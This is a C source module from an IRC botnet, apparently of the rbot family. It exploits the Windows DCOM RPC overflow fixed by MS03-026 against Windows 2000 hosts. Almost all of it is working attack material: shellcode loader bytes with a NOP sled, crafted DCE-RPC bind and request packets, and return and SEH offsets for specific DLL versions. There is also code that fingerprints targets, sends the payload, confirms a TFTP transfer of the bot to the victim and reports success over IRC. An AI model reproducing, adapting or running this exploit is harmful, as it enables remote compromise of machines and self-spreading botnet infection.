#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DCOM2

char dcom2_loader[]=
	"\xE8\x00\x00\x00\x00\x58\x66\x31\xC0\x40\x81\x38\x64\x63\x6F"
	"\x6D\x75\xF7\x81\x78\x04\x68\x78\x30\x72\x75\xEE\x05\x08\x00\x00"
	"\x00\xFF\xE0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90";

char dcom2_bindstr[]=
	"\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00"
	"\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00"
	"\xa0\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
	"\x2B\x10\x48\x60\x02\x00\x00\x00";

char dcom2_request1[]=
	"\x05\x00\x00\x03\x10\x00\x00\x00\xE8\x03\x00\x00\xE5\x00\x00\x00"
	"\xD0\x03\x00\x00\x01\x00\x04\x00\x05\x00\x06\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x32\x24\x58\xFD\xCC\x45\x64\x49\xB0\x70\xDD\xAE"
	"\x74\x2C\x96\xD2\x60\x5E\x0D\x00\x01\x00\x00\x00\x00\x00\x00\x00"
	"\x70\x5E\x0D\x00\x02\x00\x00\x00\x7C\x5E\x0D\x00\x00\x00\x00\x00"
	"\x10\x00\x00\x00\x80\x96\xF1\xF1\x2A\x4D\xCE\x11\xA6\x6A\x00\x20"
	"\xAF\x6E\x72\xF4\x0C\x00\x00\x00\x4D\x41\x52\x42\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x0D\xF0\xAD\xBA\x00\x00\x00\x00\xA8\xF4\x0B\x00"
	"\x60\x03\x00\x00\x60\x03\x00\x00\x4D\x45\x4F\x57\x04\x00\x00\x00"
	"\xA2\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x38\x03\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"
	"\x00\x00\x00\x00\x30\x03\x00\x00\x28\x03\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\xC8\x00\x00\x00\x4D\x45\x4F\x57"
	"\x28\x03\x00\x00\xD8\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00"
	"\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\xC4\x28\xCD\x00\x64\x29\xCD\x00\x00\x00\x00\x00"
	"\x07\x00\x00\x00\xB9\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAB\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA5\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA6\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xA4\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAD\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\xAA\x01\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00"
	"\x00\x00\x00\x46\x07\x00\x00\x00\x60\x00\x00\x00\x58\x00\x00\x00"
	"\x90\x00\x00\x00\x40\x00\x00\x00\x20\x00\x00\x00\x78\x00\x00\x00"
	"\x30\x00\x00\x00\x01\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x50\x00\x00\x00\x4F\xB6\x88\x20\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x08\x00\xCC\xCC\xCC\xCC"
	"\x48\x00\x00\x00\x07\x00\x66\x00\x06\x09\x02\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x10\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x78\x19\x0C\x00"
	"\x58\x00\x00\x00\x05\x00\x06\x00\x01\x00\x00\x00\x70\xD8\x98\x93"
	"\x98\x4F\xD2\x11\xA9\x3D\xBE\x57\xB2\x00\x00\x00\x32\x00\x31\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x80\x00\x00\x00\x0D\xF0\xAD\xBA"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x18\x43\x14\x00\x00\x00\x00\x00\x60\x00\x00\x00\x60\x00\x00\x00"
	"\x4D\x45\x4F\x57\x04\x00\x00\x00\xC0\x01\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x3B\x03\x00\x00\x00\x00\x00\x00"
	"\xC0\x00\x00\x00\x00\x00\x00\x46\x00\x00\x00\x00\x30\x00\x00\x00"
	"\x01\x00\x01\x00\x81\xC5\x17\x03\x80\x0E\xE9\x4A\x99\x99\xF1\x8A"
	"\x50\x6F\x7A\x85\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x30\x00\x00\x00\x78\x00\x6E\x00"
	"\x00\x00\x00\x00\xD8\xDA\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x20\x2F\x0C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
	"\x00\x00\x00\x00\x03\x00\x00\x00\x46\x00\x58\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x10\x00\x00\x00\x30\x00\x2E\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x68\x00\x00\x00\x0E\x00\xFF\xFF"
	"\x68\x8B\x0B\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char dcom2_request2[]=
	"\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x5C\x00\x5C\x00";

// filename
char dcom2_request3[]=
	"\x5C\x00\x43\x00\x24\x00\x5C\x00\x31\x00\x32\x00\x33\x00\x34\x00"
	"\x35\x00\x36\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00\x31\x00"
	"\x31\x00\x2E\x00\x64\x00\x6F\x00\x63\x00\x00\x00";

char dcom2_request4[]=
	"\x01\x10\x08\x00\xCC\xCC\xCC\xCC\x20\x00\x00\x00\x30\x00\x2D\x00"
	"\x00\x00\x00\x00\x88\x2A\x0C\x00\x02\x00\x00\x00\x01\x00\x00\x00"
	"\x28\x8C\x0C\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00";

char dcom2_shellcode_buf[]=
	"\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00\x2e\x00"
	"\x30\x00\x2e\x00\x31\x00\x5c\x00\x49\x00\x50\x00"
	"\x43\x00\x24\x00\x5c\x00"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
	"\xe9\xf3\xfd\xff\xff"
	"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE";

dcom2_offset dcom2_my_offsets[]=
{
	// Win2K English SP4 + MS03-026
	{	0x7c54144c,		// kernel32.dll v5.0.2195.6688
		0x77a1b496	},	// OLEAUT32.dll v2.40.4522.0
	// Win2K English SP3 + HotFixes + MS03-026
	{	0x77eda1f0,		// kernel32.dll v5.0.2195.6079
		0x77a1afa9	},	// OLEAUT32.dll v2.40.4518.0
	{	0x41414141,		// test
		0x77FCC662	}	// test
};

BOOL dcom2(EXINFO exinfo)
{
	char sendbuf[IRCLINE],*pTemp;
	char szRecvBuf[4096],szLoadBuf[4096],szReqBuf[4096],szShellBuf[4096],szLoaderBuf[4096];
	int iShellSize=0,iLoaderSize=0,iPos=0,iSCSize=0,iLoadSize=0,iReqSize=0;

	int TargetOS = FpHost(exinfo.ip, FP_RPC);
	if (TargetOS == OS_UNKNOWN || TargetOS == OS_WINNT) return FALSE;

	// get a funky fresh socket
	SOCKET sSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	if (sSocket == SOCKET_ERROR) return FALSE;

	// fill in sockaddr and resolve the host
	SOCKADDR_IN ssin; 
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)exinfo.port);
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

	iShellSize = GetRNS0TerminatedShellcode(szShellBuf, 4096, GetIP(exinfo.sock), filename);
	if (!iShellSize) return 0;

	iLoaderSize = EncodeRNS0(szLoaderBuf, 4096, dcom2_loader, sizeof(dcom2_loader)-1);

	memcpy(szLoadBuf+iPos,							dcom2_shellcode_buf,	sizeof(dcom2_shellcode_buf)		); iPos+=sizeof(dcom2_shellcode_buf);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_SC,			szLoaderBuf,			iLoaderSize						);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_SC,			szShellBuf,             iShellSize	);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_JMP_ADDR,	&dcom2_my_offsets[0].lJmpAddr,	4						);
	memcpy(szLoadBuf+DCOM2_SCBUF_OFFSET_TOP_SEH, 	&dcom2_my_offsets[0].lTopSEH,	4						);
	iLoadSize = iPos; iPos = 0;

	pTemp = szReqBuf+sizeof(dcom2_request1)-1; // Fill the request with the right sizes
	*(unsigned long*)(pTemp)		= *(unsigned long*)(pTemp)		+ iLoadSize / 2;
	*(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iLoadSize / 2; pTemp=szReqBuf;
    *(unsigned long*)(pTemp+8)		= *(unsigned long*)(pTemp+8)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+16)		= *(unsigned long*)(pTemp+16)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+128)	= *(unsigned long*)(pTemp+128)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+132)	= *(unsigned long*)(pTemp+132)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+180)	= *(unsigned long*)(pTemp+180)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+184)	= *(unsigned long*)(pTemp+184)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+208)	= *(unsigned long*)(pTemp+208)	+ iLoadSize - 12;
	*(unsigned long*)(pTemp+396)	= *(unsigned long*)(pTemp+396)	+ iLoadSize - 12;

	// connect with target IP
	int iErr = fconnect(sSocket, (LPSOCKADDR)&ssin, sizeof(ssin));
	if (iErr==-1) { // connect failed, exit
		fclosesocket(sSocket);
		return FALSE;
	}

	// send the bind string
	if (fsend(sSocket, dcom2_bindstr, sizeof(dcom2_bindstr)-1, 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}

	// read reply
	frecv(sSocket, szRecvBuf, 4096, 0);

	// Check for DCE_PKT_BINDACK
	if (szRecvBuf[2] != DCE_PKT_BINDACK) {
		fclosesocket(sSocket);
		return FALSE;
	}

	// send evil request
	if (fsend(sSocket, szReqBuf, iReqSize, 0) == SOCKET_ERROR) {
		fclosesocket(sSocket);
		return FALSE;
	}

	// read reply
	frecv(sSocket, szRecvBuf, 4096, 0);

	if (szRecvBuf[2] == DCE_PKT_FAULT) {
		fclosesocket(sSocket);
		return FALSE;
	}

	fclosesocket(sSocket);

	sprintf(sendbuf,"[TFTP]: File transfer complete to IP: %s", exinfo.ip);
	for (int i=0; i < 6; i++) {
		if (searchlog(sendbuf)) {
//			sprintf(sendbuf, "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
			if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
			addlog(sendbuf);
			exploit[exinfo.exploit].stats++;

			break;
		}
		Sleep(5000);
	}

	return TRUE;
}
#endif